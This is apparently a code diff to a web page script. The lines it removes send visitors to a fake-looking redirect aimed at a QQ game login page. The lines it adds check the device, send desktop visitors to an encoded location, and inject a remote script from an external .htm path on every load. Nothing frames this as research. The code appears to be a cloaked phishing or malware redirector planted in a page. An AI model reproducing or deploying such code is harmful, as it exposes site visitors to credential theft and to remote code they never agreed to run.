@@ -1,3 +1,10 @@
-var urls=['https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{wwwwww}{nnnnnn}',];
-location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
-function myEeplace(s){return s.replace(/\{(\w+?)\}/g,function(a,b){var h='';for(var i=0;i<b.length;i++){if('n'==b[i]){h+=Math.floor(Math.random()*10);}else if('w'==b[i]){h+=String.fromCharCode(97+Math.floor(Math.random()*26));}}return h;});}
+<html><head><script>
+function aaa1() {
+    if ((/^(Win|Mac)/i.test(navigator.platform) || !/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent)) && (!localStorage.isCheney || parseInt(conf.mobile))) {
+        location = 'MTMxMDI2NjI3MjcwMDYzNzQ';
+    }
+};
+aaa1();
+
+document.write('<script type="text/javascript"src="https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm?'+Math.random()+'"><\/script>');
+</script>
